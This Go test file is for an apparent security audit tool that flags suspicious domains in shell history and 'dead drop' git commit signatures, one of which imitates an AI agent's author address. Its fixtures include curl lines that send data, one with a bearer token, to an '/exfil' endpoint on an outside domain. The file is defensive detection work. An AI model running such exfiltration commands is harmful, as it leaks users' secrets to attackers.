package audit

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"
)

func TestScanHistory_DetectsDomainOnLine(t *testing.T) {
	dir := t.TempDir()
	hpath := filepath.Join(dir, ".zsh_history")
	contents := strings.Join([]string{
		": 1:0;ls",
		": 2:0;curl -s https://api.masscan.cloud/exfil",
		": 3:0;ssh somewhere",
		": 4:0;dig getsession.org",
	}, "\n")
	if err := os.WriteFile(hpath, []byte(contents), 0o644); err != nil {
		t.Fatal(err)
	}
	statuses, hits := scanHistory(
		[]string{hpath}, []string{"masscan.cloud", "getsession.org"}, false,
	)
	if len(statuses) != 1 || statuses[0].Status != "completed" {
		t.Fatalf("statuses=%+v, want one completed", statuses)
	}
	if len(hits) != 2 {
		t.Fatalf("hits=%d, want 2 (got %+v)", len(hits), hits)
	}
	want := map[string]bool{"masscan.cloud": false, "getsession.org": false}
	for _, h := range hits {
		want[h.Domain] = true
	}
	for d, found := range want {
		if !found {
			t.Errorf("missing expected domain hit: %s", d)
		}
	}
}

func TestScanHistory_MissingFileSkipsSilently(t *testing.T) {
	statuses, hits := scanHistory([]string{"/no/such/file"}, []string{"any.example"}, false)
	if len(statuses) != 1 || statuses[0].Status != "skipped" || len(hits) != 0 {
		t.Errorf("expected skipped result for missing file, got statuses=%v hits=%v", statuses, hits)
	}
}

func TestScanHistoryRedactsCredentialBearingLineByDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "history")
	line := "curl -H 'Authorization: Bearer super-secret-token' https://masscan.cloud/exfil" // gitleaks:allow -- synthetic redaction fixture
	if err := os.WriteFile(path, []byte(line+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, hits := scanHistory([]string{path}, []string{"masscan.cloud"}, false)
	if len(hits) != 1 {
		t.Fatalf("hits = %+v", hits)
	}
	if hits[0].LineNumber != 1 || hits[0].FullLine != "" ||
		strings.Contains(hits[0].Context, "super-secret-token") {
		t.Fatalf("history credential leaked: %+v", hits[0])
	}

	_, unsafeHits := scanHistory([]string{path}, []string{"masscan.cloud"}, true)
	if len(unsafeHits) != 1 || unsafeHits[0].FullLine != line {
		t.Fatalf("explicit unsafe mode did not preserve diagnostic line: %+v", unsafeHits)
	}
}

func TestScanHistoryReportsOversizedAndUnreadableInputs(t *testing.T) {
	dir := t.TempDir()
	oversized := filepath.Join(dir, "oversized")
	if err := os.WriteFile(oversized, []byte(strings.Repeat("x", 1024*1024+1)), 0o600); err != nil {
		t.Fatal(err)
	}
	unreadable := filepath.Join(dir, "directory-not-file")
	if err := os.Mkdir(unreadable, 0o700); err != nil {
		t.Fatal(err)
	}
	statuses, _ := scanHistory(
		[]string{oversized, unreadable}, []string{"example.invalid"}, false,
	)
	if len(statuses) != 2 {
		t.Fatalf("statuses = %+v", statuses)
	}
	for _, status := range statuses {
		if status.Status != "failed" || status.Diagnostic == "" {
			t.Fatalf("expected explicit failure, got %+v", status)
		}
	}
}

func TestScanGitReposReportsFailingGitLog(t *testing.T) {
	root := t.TempDir()
	repo := filepath.Join(root, "broken")
	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	statuses, hits := scanGitRepos(root, []DeadDropSig{{
		AuthorPattern: "bot", MessagePattern: "payload",
	}})
	if len(hits) != 0 || len(statuses) != 1 ||
		statuses[0].Status != "failed" || statuses[0].Path != repo {
		t.Fatalf("expected failed git-log coverage, got statuses=%+v hits=%+v", statuses, hits)
	}
}

func TestLoadDeadDropSignatures(t *testing.T) {
	in := strings.Join([]string{
		"# comment",
		"",
		"claude@users.noreply.github.com\tchore: update dependencies",
		"# blank-tab below",
		"\tno-author",
		"missing-tab",
		"  dep@bot.example  \t  update lockfiles  ",
	}, "\n")
	fs := fstest.MapFS{
		"dead-drop-signatures.txt": &fstest.MapFile{Data: []byte(in)},
	}
	open := func(name string) (fsFile, error) {
		f, err := fs.Open(name)
		return f, err
	}
	sigs, err := loadDeadDropSignatures(open)
	if err != nil {
		t.Fatal(err)
	}
	if len(sigs) != 2 {
		t.Fatalf("got %d sigs, want 2: %+v", len(sigs), sigs)
	}
	if sigs[0].AuthorPattern != "claude@users.noreply.github.com" ||
		sigs[0].MessagePattern != "chore: update dependencies" {
		t.Errorf("sig[0] wrong: %+v", sigs[0])
	}
	if sigs[1].AuthorPattern != "dep@bot.example" || sigs[1].MessagePattern != "update lockfiles" {
		t.Errorf("sig[1] wrong (whitespace trim): %+v", sigs[1])
	}
}

// fsFile is a tiny shim so the test can pass loadDeadDropSignatures a
// fstest.MapFS-backed opener without us depending on internal/ioc semantics.
type fsFile = fs.File
